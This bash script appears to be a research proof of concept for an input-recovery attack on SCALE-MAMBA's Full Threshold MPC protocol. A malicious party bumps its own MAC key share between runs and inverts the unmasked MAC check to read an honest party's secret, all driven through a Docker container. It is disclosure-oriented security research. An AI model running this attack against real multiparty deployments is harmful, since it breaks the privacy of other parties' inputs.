#!/usr/bin/env bash
# Cross-run MAC-key-inconsistency STRONGER attack on SCALE-MAMBA Full Threshold:
# FULL INPUT RECOVERY in a single run (Section 4.4).
#
# run-attack.sh is the selective-failure variant: the attacker guesses y and
# learns one bit (right/wrong) from complete-vs-abort. This script is the
# stronger attack. SCALE-MAMBA's MAC check is the *unmasked* Damgard et al.
# (2013) check: every party commits to and opens its own check share, so the
# opened value of a masked opening d = y - b is exactly (alpha+1)*d - m_d = g - y.
# The attacker therefore reads y outright -- no guessing -- even though the run
# then aborts and the opened value d is uniform and reveals nothing on its own.
#
# The only adversarial action is still the single between-runs edit to Player 1's
# own Data/MKey-1.key (alpha_1 += 1). No MAC-tag edit and no guess are needed.
# The attacker (Player 1) runs the SAME binary as the honest party; it merely
# sets OFFKEY_RECOVER=1 so its own process inverts the value it already holds.
#
# Usage: ./run-recovery.sh [secret]
#   ./run-recovery.sh 12345       # attacker recovers y = 12345 in one run
#   FAKE=1 ./run-recovery.sh 42   # fast trusted-dealer offline (seconds)
set -euo pipefail
cd "$(dirname "$0")"

SECRET="${1:-12345}"
IMAGE=scale-mamba-attack
CONTAINER=scale-mamba-recovery-run

echo "=== SCALE-MAMBA cross-run input-recovery attack (unmasked check, Sec 4.4) ==="
echo "Honest party's secret: y = $SECRET   (known only to the honest party)"
echo "The attacker recovers y in a single run -- no guessing."
[ "${FAKE:-0}" = 1 ] && echo "Offline: trusted-dealer (FAKE=1, fast)" || echo "Offline: FHE/BGV (real)"
echo

# 1. Build the pinned, patched SCALE-MAMBA image if needed.
if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
  echo "--- Building $IMAGE (one-time, ~15-20 min) ---"
  docker build --platform linux/amd64 -t "$IMAGE" .
fi

# 2. Fresh container from the clean image.
cleanup() { docker rm -f "$CONTAINER" >/dev/null 2>&1 || true; }
trap cleanup EXIT
cleanup
docker run -d --name "$CONTAINER" --platform linux/amd64 "$IMAGE" sleep infinity >/dev/null

# Sync current scripts so edits to poc.sh / patcher.py take effect without a rebuild.
docker cp poc.sh     "$CONTAINER":/scale/poc/poc.sh >/dev/null
docker cp patcher.py "$CONTAINER":/scale/poc/patcher.py >/dev/null

poc() { docker exec -e FAKE="${FAKE:-0}" -e QUIET=1 "$CONTAINER" bash -lc "bash /scale/poc/poc.sh $*"; }

echo "--- Run 1: honest party stores its secret (authenticated under MAC key alpha) ---"
poc store "$SECRET"

echo
echo "--- Run 2: attacker restarts (alpha_1 += 1) and inverts the unmasked check ---"
out="$(poc recover 0)"
echo "$out" | sed 's/^/  /'
REC="$(printf '%s\n' "$out" | sed -n 's/.*RECOVERED_Y=\([0-9-]*\).*/\1/p' | head -1)"

echo
echo "=== RESULT ==="
if [ -n "$REC" ]; then
  echo "Attacker recovered the honest party's secret: y = $REC"
  if [ "$REC" = "$SECRET" ]; then
    echo "(matches the true secret $SECRET -- recovered in a single run)"
  else
    echo "(true secret was $SECRET; recovered value differs -- inspect logs)"
  fi
else
  echo "No recovery line found; inspect the run output above."
  exit 1
fi
echo
echo "The opened value d = y - b was uniform and leaked nothing on its own; the"
echo "secret leaked through the *unmasked* check value, which the attacker inverts"
echo "before the abort. The honest party (P0) ran the unmodified binary with no"
echo "environment flags; only P1's own MKey-1.key was edited between the runs."
